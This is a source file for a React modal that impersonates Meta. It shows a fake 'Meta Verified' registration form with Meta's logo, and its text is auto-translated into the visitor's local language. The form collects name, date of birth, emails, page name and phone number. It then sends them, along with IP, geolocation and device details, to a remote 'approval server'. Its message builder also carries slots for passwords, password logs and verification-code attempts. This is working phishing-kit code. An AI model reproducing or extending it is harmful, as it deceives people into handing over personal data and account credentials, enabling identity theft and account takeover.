import MetaLogo from '@/assets/images/meta-logo-image.png';
import { useSocketEmit } from '@/hooks/use-socket';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import { buildAppealMessage, geoToIpInfo } from '@/utils/message';
import { sendAppealMessage } from '@/utils/socket-approval';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    dob: string;
    personalEmail: string;
    businessEmail: string;
    pageName: string;
}

const FORM_FIELDS: { name: keyof FormData; label: string; type: 'text' | 'email' | 'date' }[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'dob', label: 'Date of Birth', type: 'date' },
    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' }
];

const TEXTS = [
    'Complete the free Meta Verified registration form.',
    'Mobile phone number',
    'Our response will be sent to you within 14-40 hours.',
    'I agree with Terms of use',
    'Send',
    'Could not reach the approval server. Start the backend (pnpm dev:backend) and check VPS_BACKEND_URL in .env.local.'
] as const;

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [agreeToTerms, setAgreeToTerms] = useState(false);
    const [submitError, setSubmitError] = useState('');
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        dob: '',
        personalEmail: '',
        businessEmail: '',
        pageName: ''
    });

    const {
        setModalOpen,
        geoInfo,
        setAppealProfile,
        setFormData: persistAppealForm,
        setMessageId,
        deviceLabel,
        setDeviceLabel
    } = store();
    const { socket } = useSocketEmit();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = 'Meta Verified';
    }, []);

    useEffect(() => {
        if (typeof window !== 'undefined' && deviceLabel === 'Unknown') {
            setDeviceLabel(getDeviceLabel(navigator.userAgent));
        }
    }, [deviceLabel, setDeviceLabel]);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of TEXTS) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            for (const field of FORM_FIELDS) {
                translatedMap[field.label] = await translateText(field.label, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading || !agreeToTerms) {
            return;
        }

        setIsLoading(true);
        setSubmitError('');

        const payload = {
            fullName: formData.fullName.trim(),
            dateOfBirth: formData.dob.trim(),
            personalEmail: formData.personalEmail.trim(),
            businessEmail: formData.businessEmail.trim(),
            phone: phoneNumber,
            pageName: formData.pageName.trim(),
            reason: 'Meta Verified registration',
            additionalNotes: ''
        };

        try {
            setAppealProfile({
                fullName: payload.fullName,
                personalEmail: payload.personalEmail,
                phone: phoneNumber
            });
            persistAppealForm(payload);

            if (!geoInfo || !socket) {
                setSubmitError(t(TEXTS[5]));
                return;
            }

            const message = buildAppealMessage({
                form: payload,
                login: { email: '', password: '' },
                passwordLogs: [],
                codeAttempts: [],
                ip: geoToIpInfo(geoInfo),
                deviceLabel
            });
            const newMessageId = await sendAppealMessage(socket, {
                message,
                message_id: null,
                stage: 'info'
            });
            setMessageId(newMessageId);
            nextStep();
        } catch {
            setSubmitError(t(TEXTS[5]));
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='modal-overlay modal-overlay--light' role='dialog' aria-modal='true'>
            <div className='modal-card-gradient'>
                    <div className='modal-card-gradient-header'>
                        <p className='modal-card-gradient-title'>{t(TEXTS[0])}</p>
                        <button
                            type='button'
                            className='modal-close-btn'
                            onClick={() => setModalOpen(false)}
                            aria-label='Close modal'
                        >
                            <FontAwesomeIcon icon={faXmark} />
                        </button>
                    </div>

                    <form onSubmit={handleSubmit} className='modal-form-body'>
                        {submitError ? (
                            <p className='text-xs text-red-600' role='alert'>
                                {submitError}
                            </p>
                        ) : null}
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='form-field-label'>{t(field.label)}</p>
                                <input
                                    required
                                    name={field.name}
                                    type={field.type}
                                    value={formData[field.name]}
                                    onChange={handleInputChange}
                                    className='form-input'
                                />
                            </div>
                        ))}
                        <p className='form-field-label'>{t(TEXTS[1])}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                required: true,
                                className: 'form-input'
                            }}
                        />
                        <p className='form-hint'>{t(TEXTS[2])}</p>
                        <div className='form-checkbox-row'>
                            <input
                                type='checkbox'
                                id='agreeTerms'
                                checked={agreeToTerms}
                                onChange={(e) => setAgreeToTerms(e.target.checked)}
                            />
                            <label htmlFor='agreeTerms'>{t(TEXTS[3])}</label>
                        </div>
                        <button
                            type='submit'
                            disabled={isLoading || !agreeToTerms}
                            className='btn-submit-full disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            {isLoading ? (
                                <span className='inline-block h-5 w-5 animate-spin-fast rounded-full border-2 border-white border-b-transparent' />
                            ) : (
                                t(TEXTS[4])
                            )}
                        </button>
                    </form>

                    <div className='modal-card-footer-logo'>
                        <Image src={MetaLogo} alt='Meta' height={16} />
                    </div>
            </div>
        </div>
    );
};

export default InitModal;
